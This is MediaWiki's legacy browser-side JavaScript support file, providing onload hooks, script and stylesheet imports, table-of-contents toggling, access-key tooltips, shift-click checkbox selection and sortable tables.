// MediaWiki JavaScript support functions

var clientPC = navigator.userAgent.toLowerCase(); // Get client info
var is_gecko = /gecko/.test( clientPC ) &&
	!/khtml|spoofer|netscape\/7\.0/.test(clientPC);
var webkit_match = clientPC.match(/applewebkit\/(\d+)/);
if (webkit_match) {
	var is_safari = clientPC.indexOf('applewebkit') != -1 &&
		clientPC.indexOf('spoofer') == -1;
	var is_safari_win = is_safari && clientPC.indexOf('windows') != -1;
	var webkit_version = parseInt(webkit_match[1]);
}
// For accesskeys; note that FF3+ is included here!
var is_ff2 = /firefox\/[2-9]|minefield\/3/.test( clientPC );
var ff2_bugs = /firefox\/2/.test( clientPC );
// These aren't used here, but some custom scripts rely on them
var is_ff2_win = is_ff2 && clientPC.indexOf('windows') != -1;
var is_ff2_x11 = is_ff2 && clientPC.indexOf('x11') != -1;
if (clientPC.indexOf('opera') != -1) {
	var is_opera = true;
	var is_opera_preseven = window.opera && !document.childNodes;
	var is_opera_seven = window.opera && document.childNodes;
	var is_opera_95 = /opera\/(9\.[5-9]|[1-9][0-9])/.test( clientPC );
	var opera6_bugs = is_opera_preseven;
	var opera7_bugs = is_opera_seven && !is_opera_95;
	var opera95_bugs = /opera\/(9\.5)/.test( clientPC );
}

// Global external objects used by this script.
/*extern ta, stylepath, skin */

// add any onload functions in this hook (please don't hard-code any events in the xhtml source)
var doneOnloadHook;

if (!window.onloadFuncts) {
	var onloadFuncts = [];
}

// code that is dependent on js2 functions should use js2AddOnloadHook
function addOnloadHook(hookFunct) {
	// Allows add-on scripts to add onload functions
	if(!doneOnloadHook) {
		onloadFuncts[onloadFuncts.length] = hookFunct;
	} else {
		hookFunct();  // bug in MSIE script loading
	}
}


function hookEvent(hookName, hookFunct) {
	addHandler(window, hookName, hookFunct);
}

function importScript(page) {
	// TODO: might want to introduce a utility function to match wfUrlencode() in PHP
	var uri = wgScript + '?title=' +
		encodeURIComponent(page.replace(/ /g,'_')).replace(/%2F/ig,'/').replace(/%3A/ig,':') +
		'&action=raw&ctype=text/javascript';
	return importScriptURI(uri);
}

var loadedScripts = {}; // included-scripts tracker
function importScriptURI(url) {
	if (loadedScripts[url]) {
		return null;
	}
	loadedScripts[url] = true;
	var s = document.createElement('script');
	s.setAttribute('src',url);
	s.setAttribute('type','text/javascript');
	document.getElementsByTagName('head')[0].appendChild(s);
	return s;
}

function importStylesheet(page) {
	return importStylesheetURI(wgScript + '?action=raw&ctype=text/css&title=' + encodeURIComponent(page.replace(/ /g,'_')));
}

function importStylesheetURI(url,media) {
	var l = document.createElement('link');
	l.type = 'text/css';
	l.rel = 'stylesheet';
	l.href = url;
	if(media) l.media = media
	document.getElementsByTagName('head')[0].appendChild(l);
	return l;
}

function appendCSS(text) {
	var s = document.createElement('style');
	s.type = 'text/css';
	s.rel = 'stylesheet';
	if (s.styleSheet) s.styleSheet.cssText = text //IE
	else s.appendChild(document.createTextNode(text + '')) //Safari sometimes borks on null
	document.getElementsByTagName('head')[0].appendChild(s);
	return s;
}

// special stylesheet links
if (typeof stylepath != 'undefined' && typeof skin != 'undefined') {
	// FIXME: This tries to load the stylesheets even for skins where they
	// don't exist, i.e., everything but Monobook.
	if (opera6_bugs) {
		importStylesheetURI(stylepath+'/'+skin+'/Opera6Fixes.css');
	} else if (opera7_bugs) {
		importStylesheetURI(stylepath+'/'+skin+'/Opera7Fixes.css');
	} else if (opera95_bugs) {
		importStylesheetURI(stylepath+'/'+skin+'/Opera9Fixes.css');
	} else if (ff2_bugs) {
		importStylesheetURI(stylepath+'/'+skin+'/FF2Fixes.css');
	}
}


if (wgBreakFrames) {
	// Un-trap us from framesets
	if (window.top != window) {
		window.top.location = window.location;
	}
}

function showTocToggle() {
	if (document.createTextNode) {
		// Uses DOM calls to avoid document.write + XHTML issues

		var linkHolder = document.getElementById('toctitle');
		var existingLink = document.getElementById('togglelink');
		if (!linkHolder || existingLink) {
			// Don't add the toggle link twice
			return;
		}

		var outerSpan = document.createElement('span');
		outerSpan.className = 'toctoggle';

		var toggleLink = document.createElement('a');
		toggleLink.id = 'togglelink';
		toggleLink.className = 'internal';
		toggleLink.href = 'javascript:toggleToc()';
		toggleLink.appendChild(document.createTextNode(tocHideText));

		outerSpan.appendChild(document.createTextNode('['));
		outerSpan.appendChild(toggleLink);
		outerSpan.appendChild(document.createTextNode(']'));

		linkHolder.appendChild(document.createTextNode(' '));
		linkHolder.appendChild(outerSpan);

		var cookiePos = document.cookie.indexOf("hidetoc=");
		if (cookiePos > -1 && document.cookie.charAt(cookiePos + 8) == 1) {
			toggleToc();
		}
	}
}

function changeText(el, newText) {
	// Safari work around
	if (el.innerText) {
		el.innerText = newText;
	} else if (el.firstChild && el.firstChild.nodeValue) {
		el.firstChild.nodeValue = newText;
	}
}

function toggleToc() {
	var tocmain = document.getElementById('toc');
	var toc = document.getElementById('toc').getElementsByTagName('ul')[0];
	var toggleLink = document.getElementById('togglelink');

	if (toc && toggleLink && toc.style.display == 'none') {
		changeText(toggleLink, tocHideText);
		toc.style.display = 'block';
		document.cookie = "hidetoc=0";
		tocmain.className = 'toc';
	} else {
		changeText(toggleLink, tocShowText);
		toc.style.display = 'none';
		document.cookie = "hidetoc=1";
		tocmain.className = 'toc tochidden';
	}
}

var mwEditButtons = [];
var mwCustomEditButtons = []; // eg to add in MediaWiki:Common.js

function escapeQuotes(text) {
	var re = new RegExp("'","g");
	text = text.replace(re,"\\'");
	re = new RegExp("\\n","g");
	text = text.replace(re,"\\n");
	return escapeQuotesHTML(text);
}

function escapeQuotesHTML(text) {
	var re = new RegExp('&',"g");
	text = text.replace(re,"&amp;");
	re = new RegExp('"',"g");
	text = text.replace(re,"&quot;");
	re = new RegExp('<',"g");
	text = text.replace(re,"&lt;");
	re = new RegExp('>',"g");
	text = text.replace(re,"&gt;");
	return text;
}


/**
 * Set the accesskey prefix based on browser detection.
 */
var tooltipAccessKeyPrefix = 'alt-';
if (is_opera) {
	tooltipAccessKeyPrefix = 'shift-esc-';
} else if (!is_safari_win && is_safari && webkit_version > 526) {
	tooltipAccessKeyPrefix = 'ctrl-alt-';
} else if (!is_safari_win && (is_safari
		|| clientPC.indexOf('mac') != -1
		|| clientPC.indexOf('konqueror') != -1 )) {
	tooltipAccessKeyPrefix = 'ctrl-';
} else if (is_ff2) {
	tooltipAccessKeyPrefix = 'alt-shift-';
}
var tooltipAccessKeyRegexp = /\[(ctrl-)?(alt-)?(shift-)?(esc-)?(.)\]$/;

/**
 * Add the appropriate prefix to the accesskey shown in the tooltip.
 * If the nodeList parameter is given, only those nodes are updated;
 * otherwise, all the nodes that will probably have accesskeys by
 * default are updated.
 *
 * @param Array nodeList -- list of elements to update
 */
function updateTooltipAccessKeys( nodeList ) {
	if ( !nodeList ) {
		// Rather than scan all links on the whole page, we can just scan these
		// containers which contain the relevant links. This is really just an
		// optimization technique.
		var linkContainers = [
			"column-one", // Monobook and Modern
			"head", "panel", "p-logo" // Vector
		];
		for ( var i in linkContainers ) {
			var linkContainer = document.getElementById( linkContainers[i] );
			if ( linkContainer ) {
				updateTooltipAccessKeys( linkContainer.getElementsByTagName("a") );
			}
		}
		// these are rare enough that no such optimization is needed
		updateTooltipAccessKeys( document.getElementsByTagName("input") );
		updateTooltipAccessKeys( document.getElementsByTagName("label") );
		return;
	}

	for ( var i = 0; i < nodeList.length; i++ ) {
		var element = nodeList[i];
		var tip = element.getAttribute("title");
		if ( tip && tooltipAccessKeyRegexp.exec(tip) ) {
			tip = tip.replace(tooltipAccessKeyRegexp,
					  "["+tooltipAccessKeyPrefix+"$5]");
			element.setAttribute("title", tip );
		}
	}
}

/**
 * Add a link to one of the portlet menus on the page, including:
 *
 * p-cactions: Content actions (shown as tabs above the main content in Monobook)
 * p-personal: Personal tools (shown at the top right of the page in Monobook)
 * p-navigation: Navigation
 * p-tb: Toolbox
 *
 * This function exists for the convenience of custom JS authors.  All
 * but the first three parameters are optional, though providing at
 * least an id and a tooltip is recommended.
 *
 * By default the new link will be added to the end of the list.  To
 * add the link before a given existing item, pass the DOM node of
 * that item (easily obtained with document.getElementById()) as the
 * nextnode parameter; to add the link _after_ an existing item, pass
 * the node's nextSibling instead.
 *
 * @param String portlet -- id of the target portlet ("p-cactions", "p-personal", "p-navigation" or "p-tb")
 * @param String href -- link URL
 * @param String text -- link text (will be automatically lowercased by CSS for p-cactions in Monobook)
 * @param String id -- id of the new item, should be unique and preferably have the appropriate prefix ("ca-", "pt-", "n-" or "t-")
 * @param String tooltip -- text to show when hovering over the link, without accesskey suffix
 * @param String accesskey -- accesskey to activate this link (one character, try to avoid conflicts)
 * @param Node nextnode -- the DOM node before which the new item should be added, should be another item in the same list
 *
 * @return Node -- the DOM node of the new item (an LI element) or null
 */
function addPortletLink(portlet, href, text, id, tooltip, accesskey, nextnode) {
	var root = document.getElementById(portlet);
	if ( !root ) return null;
	var node = root.getElementsByTagName( "ul" )[0];
	if ( !node ) return null;

	// unhide portlet if it was hidden before
	root.className = root.className.replace( /(^| )emptyPortlet( |$)/, "$2" );

	var span = document.createElement( "span" );
	span.appendChild( document.createTextNode( text ) );

	var link = document.createElement( "a" );
	link.appendChild( span );
	link.href = href;

	var item = document.createElement( "li" );
	item.appendChild( link );
	if ( id ) item.id = id;

	if ( accesskey ) {
		link.setAttribute( "accesskey", accesskey );
		tooltip += " ["+accesskey+"]";
	}
	if ( tooltip ) {
		link.setAttribute( "title", tooltip );
	}
	if ( accesskey && tooltip ) {
		updateTooltipAccessKeys( new Array( link ) );
	}

	if ( nextnode && nextnode.parentNode == node )
		node.insertBefore( item, nextnode );
	else
		node.appendChild( item );  // IE compatibility (?)

	return item;
}

function getInnerText(el) {
	if (typeof el == "string") return el;
	if (typeof el == "undefined") { return el };
	if (el.textContent) return el.textContent; // not needed but it is faster
	if (el.innerText) return el.innerText;     // IE doesn't have textContent
	var str = "";

	var cs = el.childNodes;
	var l = cs.length;
	for (var i = 0; i < l; i++) {
		switch (cs[i].nodeType) {
			case 1: //ELEMENT_NODE
				str += ts_getInnerText(cs[i]);
				break;
			case 3:	//TEXT_NODE
				str += cs[i].nodeValue;
				break;
		}
	}
	return str;
}


/**
 * Set up accesskeys/tooltips from the deprecated ta array.  If doId
 * is specified, only set up for that id.  Note that this function is
 * deprecated and will not be supported indefinitely -- use
 * updateTooltipAccessKey() instead.
 *
 * @param mixed doId string or null
 */
function akeytt( doId ) {
	// A lot of user scripts (and some of the code below) break if
	// ta isn't defined, so we make sure it is.  Explictly using
	// window.ta avoids a "ta is not defined" error.
	if (!window.ta) window.ta = new Array;

	// Make a local, possibly restricted, copy to avoid clobbering
	// the original.
	var ta;
	if ( doId ) {
		ta = [doId];
	} else {
		ta = window.ta;
	}

	// Now deal with evil deprecated ta
	var watchCheckboxExists = document.getElementById( 'wpWatchthis' ) ? true : false;
	for (var id in ta) {
		var n = document.getElementById(id);
		if (n) {
			var a = null;
			var ak = '';
			// Are we putting accesskey in it
			if (ta[id][0].length > 0) {
				// Is this object a object? If not assume it's the next child.

				if (n.nodeName.toLowerCase() == "a") {
					a = n;
				} else {
					a = n.childNodes[0];
				}
			 	// Don't add an accesskey for the watch tab if the watch
			 	// checkbox is also available.
				if (a && ((id != 'ca-watch' && id != 'ca-unwatch') || !watchCheckboxExists)) {
					a.accessKey = ta[id][0];
					ak = ' ['+tooltipAccessKeyPrefix+ta[id][0]+']';
				}
			} else {
				// We don't care what type the object is when assigning tooltip
				a = n;
				ak = '';
			}

			if (a) {
				a.title = ta[id][1]+ak;
			}
		}
	}
}

var checkboxes;
var lastCheckbox;

function setupCheckboxShiftClick() {
	checkboxes = [];
	lastCheckbox = null;
	var inputs = document.getElementsByTagName('input');
	addCheckboxClickHandlers(inputs);
}

function addCheckboxClickHandlers(inputs, start) {
	if ( !start) start = 0;

	var finish = start + 250;
	if ( finish > inputs.length )
		finish = inputs.length;

	for ( var i = start; i < finish; i++ ) {
		var cb = inputs[i];
		if ( !cb.type || cb.type.toLowerCase() != 'checkbox' )
			continue;
		var end = checkboxes.length;
		checkboxes[end] = cb;
		cb.index = end;
		cb.onclick = checkboxClickHandler;
	}

	if ( finish < inputs.length ) {
		setTimeout( function () {
			addCheckboxClickHandlers(inputs, finish);
		}, 200 );
	}
}

function checkboxClickHandler(e) {
	if (typeof e == 'undefined') {
		e = window.event;
	}
	if ( !e.shiftKey || lastCheckbox === null ) {
		lastCheckbox = this.index;
		return true;
	}
	var endState = this.checked;
	var start, finish;
	if ( this.index < lastCheckbox ) {
		start = this.index + 1;
		finish = lastCheckbox;
	} else {
		start = lastCheckbox;
		finish = this.index - 1;
	}
	for (var i = start; i <= finish; ++i ) {
		checkboxes[i].checked = endState;
		if( i > start && typeof checkboxes[i].onchange == 'function' )
			checkboxes[i].onchange(); // fire triggers
	}
	lastCheckbox = this.index;
	return true;
}

function toggle_element_activation(ida,idb) {
	if ( !document.getElementById ) {
		return;
	}
	// Show the appropriate upload size limit message
	if( idb == 'wpUploadFileURL' ) {
		var e = document.getElementById( 'mw-upload-maxfilesize' );
		if( e ) e.style.display = "none";

		var e = document.getElementById( 'mw-upload-maxfilesize-url' );
		if( e ) e.style.display = "block";
	}
	if( idb == 'wpUploadFile' ) {
		var e = document.getElementById( 'mw-upload-maxfilesize-url' );
		if( e ) e.style.display =  "none";

		var e = document.getElementById( 'mw-upload-maxfilesize' );
		if( e ) e.style.display =  "block";
	}
	document.getElementById( ida ).disabled = true;
	document.getElementById( idb ).disabled = false;
}

function toggle_element_check(ida,idb) {
	if (!document.getElementById) {
		return;
	}
	document.getElementById(ida).checked=true;
	document.getElementById(idb).checked=false;
}

/*
	Written by Jonathan Snook, http://www.snook.ca/jonathan
	Add-ons by Robert Nyman, http://www.robertnyman.com
	Author says "The credit comment is all it takes, no license. Go crazy with it!:-)"
	From http://www.robertnyman.com/2005/11/07/the-ultimate-getelementsbyclassname/
*/
function getElementsByClassName(oElm, strTagName, oClassNames){
	var arrReturnElements = new Array();
	if ( typeof( oElm.getElementsByClassName ) == "function" ) {
		/* Use a native implementation where possible FF3, Saf3.2, Opera 9.5 */
		var arrNativeReturn = oElm.getElementsByClassName( oClassNames );
		if ( strTagName == "*" )
			return arrNativeReturn;
		for ( var h=0; h < arrNativeReturn.length; h++ ) {
			if( arrNativeReturn[h].tagName.toLowerCase() == strTagName.toLowerCase() )
				arrReturnElements[arrReturnElements.length] = arrNativeReturn[h];
		}
		return arrReturnElements;
	}
	var arrElements = (strTagName == "*" && oElm.all)? oElm.all : oElm.getElementsByTagName(strTagName);
	var arrRegExpClassNames = new Array();
	if(typeof oClassNames == "object"){
		for(var i=0; i<oClassNames.length; i++){
			arrRegExpClassNames[arrRegExpClassNames.length] =
				new RegExp("(^|\\s)" + oClassNames[i].replace(/\-/g, "\\-") + "(\\s|$)");
		}
	}
	else{
		arrRegExpClassNames[arrRegExpClassNames.length] =
			new RegExp("(^|\\s)" + oClassNames.replace(/\-/g, "\\-") + "(\\s|$)");
	}
	var oElement;
	var bMatchesAll;
	for(var j=0; j<arrElements.length; j++){
		oElement = arrElements[j];
		bMatchesAll = true;
		for(var k=0; k<arrRegExpClassNames.length; k++){
			if(!arrRegExpClassNames[k].test(oElement.className)){
				bMatchesAll = false;
				break;
			}
		}
		if(bMatchesAll){
			arrReturnElements[arrReturnElements.length] = oElement;
		}
	}
	return (arrReturnElements)
}

function redirectToFragment(fragment) {
	var match = navigator.userAgent.match(/AppleWebKit\/(\d+)/);
	if (match) {
		var webKitVersion = parseInt(match[1]);
		if (webKitVersion < 420) {
			// Released Safari w/ WebKit 418.9.1 messes up horribly
			// Nightlies of 420+ are ok
			return;
		}
	}
	if (is_gecko) {
		// Mozilla needs to wait until after load, otherwise the window doesn't scroll
		addOnloadHook(function () {
			if (window.location.hash == "")
				window.location.hash = fragment;
		});
	} else {
		if (window.location.hash == "")
			window.location.hash = fragment;
	}
}

/*
 * Table sorting script based on one (c) 1997-2006 Stuart Langridge and Joost
 * de Valk:
 * http://www.joostdevalk.nl/code/sortable-table/
 * http://www.kryogenix.org/code/browser/sorttable/
 *
 * @todo don't break on colspans/rowspans (bug 8028)
 * @todo language-specific digit grouping/decimals (bug 8063)
 * @todo support all accepted date formats (bug 8226)
 */

var ts_image_path = stylepath+"/common/images/";
var ts_image_up = "sort_up.gif";
var ts_image_down = "sort_down.gif";
var ts_image_none = "sort_none.gif";
var ts_europeandate = wgContentLanguage != "en"; // The non-American-inclined can change to "true"
var ts_alternate_row_colors = false;
var ts_number_transform_table = null;
var ts_number_regex = null;

function sortables_init() {
	var idnum = 0;
	// Find all tables with class sortable and make them sortable
	var tables = getElementsByClassName(document, "table", "sortable");
	for (var ti = 0; ti < tables.length ; ti++) {
		if (!tables[ti].id) {
			tables[ti].setAttribute('id','sortable_table_id_'+idnum);
			++idnum;
		}
		ts_makeSortable(tables[ti]);
	}
}

function ts_makeSortable(table) {
	var firstRow;
	if (table.rows && table.rows.length > 0) {
		if (table.tHead && table.tHead.rows.length > 0) {
			firstRow = table.tHead.rows[table.tHead.rows.length-1];
		} else {
			firstRow = table.rows[0];
		}
	}
	if (!firstRow) return;

	// We have a first row: assume it's the header, and make its contents clickable links
	for (var i = 0; i < firstRow.cells.length; i++) {
		var cell = firstRow.cells[i];
		if ((" "+cell.className+" ").indexOf(" unsortable ") == -1) {
			cell.innerHTML += '&nbsp;&nbsp;'
				+ '<a href="#" class="sortheader" '
				+ 'onclick="ts_resortTable(this);return false;">'
				+ '<span class="sortarrow">'
				+ '<img src="'
				+ ts_image_path
				+ ts_image_none
				+ '" alt="&darr;"/></span></a>';
		}
	}
	if (ts_alternate_row_colors) {
		ts_alternate(table);
	}
}

function ts_getInnerText(el) {
	return getInnerText( el );
}

function ts_resortTable(lnk) {
	// get the span
	var span = lnk.getElementsByTagName('span')[0];

	var td = lnk.parentNode;
	var tr = td.parentNode;
	var column = td.cellIndex;

	var table = tr.parentNode;
	while (table && !(table.tagName && table.tagName.toLowerCase() == 'table'))
		table = table.parentNode;
	if (!table) return;

	if (table.rows.length <= 1) return;

	// Generate the number transform table if it's not done already
	if (ts_number_transform_table == null) {
		ts_initTransformTable();
	}

	// Work out a type for the column
	// Skip the first row if that's where the headings are
	var rowStart = (table.tHead && table.tHead.rows.length > 0 ? 0 : 1);

	var itm = "";
	for (var i = rowStart; i < table.rows.length; i++) {
		if (table.rows[i].cells.length > column) {
			itm = ts_getInnerText(table.rows[i].cells[column]);
			itm = itm.replace(/^[\s\xa0]+/, "").replace(/[\s\xa0]+$/, "");
			if (itm != "") break;
		}
	}

	// TODO: bug 8226, localised date formats
	var sortfn = ts_sort_generic;
	var preprocessor = ts_toLowerCase;
	if (/^\d\d[\/. -][a-zA-Z]{3}[\/. -]\d\d\d\d$/.test(itm)) {
		preprocessor = ts_dateToSortKey;
	} else if (/^\d\d[\/.-]\d\d[\/.-]\d\d\d\d$/.test(itm)) {
		preprocessor = ts_dateToSortKey;
	} else if (/^\d\d[\/.-]\d\d[\/.-]\d\d$/.test(itm)) {
		preprocessor = ts_dateToSortKey;
	// pound dollar euro yen currency cents
	} else if (/(^[\u00a3$\u20ac\u00a4\u00a5]|\u00a2$)/.test(itm)) {
		preprocessor = ts_currencyToSortKey;
	} else if (ts_number_regex.test(itm)) {
		preprocessor = ts_parseFloat;
	}

	var reverse = (span.getAttribute("sortdir") == 'down');

	var newRows = new Array();
	var staticRows = new Array();
	for (var j = rowStart; j < table.rows.length; j++) {
		var row = table.rows[j];
		if((" "+row.className+" ").indexOf(" unsortable ") < 0) {
			var keyText = ts_getInnerText(row.cells[column]);
			if(keyText == undefined) {
				keyText = ""; 
			}
			var oldIndex = (reverse ? -j : j);
			var preprocessed = preprocessor( keyText.replace(/^[\s\xa0]+/, "").replace(/[\s\xa0]+$/, "") );

			newRows[newRows.length] = new Array(row, preprocessed, oldIndex);
		} else staticRows[staticRows.length] = new Array(row, false, j-rowStart);
	}

	newRows.sort(sortfn);

	var arrowHTML;
	if (reverse) {
		arrowHTML = '<img src="'+ ts_image_path + ts_image_down + '" alt="&darr;"/>';
		newRows.reverse();
		span.setAttribute('sortdir','up');
	} else {
		arrowHTML = '<img src="'+ ts_image_path + ts_image_up + '" alt="&uarr;"/>';
		span.setAttribute('sortdir','down');
	}

	for (var i = 0; i < staticRows.length; i++) {
		var row = staticRows[i];
		newRows.splice(row[2], 0, row);
	}

	// We appendChild rows that already exist to the tbody, so it moves them rather than creating new ones
	// don't do sortbottom rows
	for (var i = 0; i < newRows.length; i++) {
		if ((" "+newRows[i][0].className+" ").indexOf(" sortbottom ") == -1)
			table.tBodies[0].appendChild(newRows[i][0]);
	}
	// do sortbottom rows only
	for (var i = 0; i < newRows.length; i++) {
		if ((" "+newRows[i][0].className+" ").indexOf(" sortbottom ") != -1)
			table.tBodies[0].appendChild(newRows[i][0]);
	}

	// Delete any other arrows there may be showing
	var spans = getElementsByClassName(tr, "span", "sortarrow");
	for (var i = 0; i < spans.length; i++) {
		spans[i].innerHTML = '<img src="'+ ts_image_path + ts_image_none + '" alt="&darr;"/>';
	}
	span.innerHTML = arrowHTML;

	if (ts_alternate_row_colors) {
		ts_alternate(table);
	}
}

function ts_initTransformTable() {
	if ( typeof wgSeparatorTransformTable == "undefined"
			|| ( wgSeparatorTransformTable[0] == '' && wgDigitTransformTable[2] == '' ) )
	{
		digitClass = "[0-9,.]";
		ts_number_transform_table = false;
	} else {
		ts_number_transform_table = {};
		// Unpack the transform table
		// Separators
		ascii = wgSeparatorTransformTable[0].split("\t");
		localised = wgSeparatorTransformTable[1].split("\t");
		for ( var i = 0; i < ascii.length; i++ ) {
			ts_number_transform_table[localised[i]] = ascii[i];
		}
		// Digits
		ascii = wgDigitTransformTable[0].split("\t");
		localised = wgDigitTransformTable[1].split("\t");
		for ( var i = 0; i < ascii.length; i++ ) {
			ts_number_transform_table[localised[i]] = ascii[i];
		}

		// Construct regex for number identification
		digits = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ',', '\\.'];
		maxDigitLength = 1;
		for ( var digit in ts_number_transform_table ) {
			// Escape regex metacharacters
			digits.push(
				digit.replace( /[\\\\$\*\+\?\.\(\)\|\{\}\[\]\-]/,
					function( s ) { return '\\' + s; } )
			);
			if (digit.length > maxDigitLength) {
				maxDigitLength = digit.length;
			}
		}
		if ( maxDigitLength > 1 ) {
			digitClass = '[' + digits.join( '', digits ) + ']';
		} else {
			digitClass = '(' + digits.join( '|', digits ) + ')';
		}
	}

	// We allow a trailing percent sign, which we just strip.  This works fine
	// if percents and regular numbers aren't being mixed.
	ts_number_regex = new RegExp(
		"^(" +
			"[+-]?[0-9][0-9,]*(\\.[0-9,]*)?(E[+-]?[0-9][0-9,]*)?" + // Fortran-style scientific
			"|" +
			"[+-]?" + digitClass + "+%?" + // Generic localised
		")$", "i"
	);
}

function ts_toLowerCase( s ) {
	return s.toLowerCase();
}

function ts_dateToSortKey(date) {
	// y2k notes: two digit years less than 50 are treated as 20XX, greater than 50 are treated as 19XX
	if (date.length == 11) {
		switch (date.substr(3,3).toLowerCase()) {
			case "jan": var month = "01"; break;
			case "feb": var month = "02"; break;
			case "mar": var month = "03"; break;
			case "apr": var month = "04"; break;
			case "may": var month = "05"; break;
			case "jun": var month = "06"; break;
			case "jul": var month = "07"; break;
			case "aug": var month = "08"; break;
			case "sep": var month = "09"; break;
			case "oct": var month = "10"; break;
			case "nov": var month = "11"; break;
			case "dec": var month = "12"; break;
			// default: var month = "00";
		}
		return date.substr(7,4)+month+date.substr(0,2);
	} else if (date.length == 10) {
		if (ts_europeandate == false) {
			return date.substr(6,4)+date.substr(0,2)+date.substr(3,2);
		} else {
			return date.substr(6,4)+date.substr(3,2)+date.substr(0,2);
		}
	} else if (date.length == 8) {
		yr = date.substr(6,2);
		if (parseInt(yr) < 50) {
			yr = '20'+yr;
		} else {
			yr = '19'+yr;
		}
		if (ts_europeandate == true) {
			return yr+date.substr(3,2)+date.substr(0,2);
		} else {
			return yr+date.substr(0,2)+date.substr(3,2);
		}
	}
	return "00000000";
}

function ts_parseFloat( s ) {
	if ( !s ) {
		return 0;
	}
	if (ts_number_transform_table != false) {
		var newNum = '', c;

		for ( var p = 0; p < s.length; p++ ) {
			c = s.charAt( p );
			if (c in ts_number_transform_table) {
				newNum += ts_number_transform_table[c];
			} else {
				newNum += c;
			}
		}
		s = newNum;
	}

	num = parseFloat(s.replace(/,/g, ""));
	return (isNaN(num) ? 0 : num);
}

function ts_currencyToSortKey( s ) {
	return ts_parseFloat(s.replace(/[^0-9.,]/g,''));
}

function ts_sort_generic(a, b) {
	return a[1] < b[1] ? -1 : a[1] > b[1] ? 1 : a[2] - b[2];
}

function ts_alternate(table) {
	// Take object table and get all it's tbodies.
	var tableBodies = table.getElementsByTagName("tbody");
	// Loop through these tbodies
	for (var i = 0; i < tableBodies.length; i++) {
		// Take the tbody, and get all it's rows
		var tableRows = tableBodies[i].getElementsByTagName("tr");
		// Loop through these rows
		// Start at 1 because we want to leave the heading row untouched
		for (var j = 0; j < tableRows.length; j++) {
			// Check if j is even, and apply classes for both possible results
			var oldClasses = tableRows[j].className.split(" ");
			var newClassName = "";
			for (var k = 0; k < oldClasses.length; k++) {
				if (oldClasses[k] != "" && oldClasses[k] != "even" && oldClasses[k] != "odd")
					newClassName += oldClasses[k] + " ";
			}
			tableRows[j].className = newClassName + (j % 2 == 0 ? "even" : "odd");
		}
	}
}

/*
 * End of table sorting code
 */


/**
 * Add a cute little box at the top of the screen to inform the user of
 * something, replacing any preexisting message.
 *
 * @param String -or- Dom Object message HTML to be put inside the right div
 * @param String className   Used in adding a class; should be different for each
 *   call to allow CSS/JS to hide different boxes.  null = no class used.
 * @return Boolean       True on success, false on failure
 */
function jsMsg( message, className ) {
	if ( !document.getElementById ) {
		return false;
	}
	// We special-case skin structures provided by the software.  Skins that
	// choose to abandon or significantly modify our formatting can just define
	// an mw-js-message div to start with.
	var messageDiv = document.getElementById( 'mw-js-message' );
	if ( !messageDiv ) {
		messageDiv = document.createElement( 'div' );
		if ( document.getElementById( 'column-content' )
		&& document.getElementById( 'content' ) ) {
			// MonoBook, presumably
			document.getElementById( 'content' ).insertBefore(
				messageDiv,
				document.getElementById( 'content' ).firstChild
			);
		} else if ( document.getElementById('content')
		&& document.getElementById( 'article' ) ) {
			// Non-Monobook but still recognizable (old-style)
			document.getElementById( 'article').insertBefore(
				messageDiv,
				document.getElementById( 'article' ).firstChild
			);
		} else {
			return false;
		}
	}

	messageDiv.setAttribute( 'id', 'mw-js-message' );
	messageDiv.style.display = 'block';
	if( className ) {
		messageDiv.setAttribute( 'class', 'mw-js-message-'+className );
	}

	if (typeof message === 'object') {
		while (messageDiv.hasChildNodes()) // Remove old content
			messageDiv.removeChild(messageDiv.firstChild);
		messageDiv.appendChild (message); // Append new content
	}
	else {
		messageDiv.innerHTML = message;
	}
	return true;
}

/**
 * Inject a cute little progress spinner after the specified element
 *
 * @param element Element to inject after
 * @param id Identifier string (for use with removeSpinner(), below)
 */
function injectSpinner( element, id ) {
	var spinner = document.createElement( "img" );
	spinner.id = "mw-spinner-" + id;
	spinner.src = stylepath + "/common/images/spinner.gif";
	spinner.alt = spinner.title = "...";
	if( element.nextSibling ) {
		element.parentNode.insertBefore( spinner, element.nextSibling );
	} else {
		element.parentNode.appendChild( spinner );
	}
}

/**
 * Remove a progress spinner added with injectSpinner()
 *
 * @param id Identifier string
 */
function removeSpinner( id ) {
	var spinner = document.getElementById( "mw-spinner-" + id );
	if( spinner ) {
		spinner.parentNode.removeChild( spinner );
	}
}

function runOnloadHook() {
	// don't run anything below this for non-dom browsers
	if (doneOnloadHook || !(document.getElementById && document.getElementsByTagName)) {
		return;
	}

	// set this before running any hooks, since any errors below
	// might cause the function to terminate prematurely
	doneOnloadHook = true;

	updateTooltipAccessKeys( null );
	akeytt( null );
	setupCheckboxShiftClick();
	sortables_init();

	// Run any added-on functions
	for (var i = 0; i < onloadFuncts.length; i++) {
		onloadFuncts[i]();
	}
}

/**
 * Add an event handler to an element
 *
 * @param Element element Element to add handler to
 * @param String attach Event to attach to
 * @param callable handler Event handler callback
 */
function addHandler( element, attach, handler ) {
	if( window.addEventListener ) {
		element.addEventListener( attach, handler, false );
	} else if( window.attachEvent ) {
		element.attachEvent( 'on' + attach, handler );
	}
}

/**
 * Add a click event handler to an element
 *
 * @param Element element Element to add handler to
 * @param callable handler Event handler callback
 */
function addClickHandler( element, handler ) {
	addHandler( element, 'click', handler );
}

/**
 * Removes an event handler from an element
 *
 * @param Element element Element to remove handler from
 * @param String remove Event to remove
 * @param callable handler Event handler callback to remove
 */
function removeHandler( element, remove, handler ) {
	if( window.removeEventListener ) {
		element.removeEventListener( remove, handler, false );
	} else if( window.detachEvent ) {
		element.detachEvent( 'on' + remove, handler );
	}
}
//note: all skins should call runOnloadHook() at the end of html output,
//      so the below should be redundant. It's there just in case.
hookEvent("load", runOnloadHook);

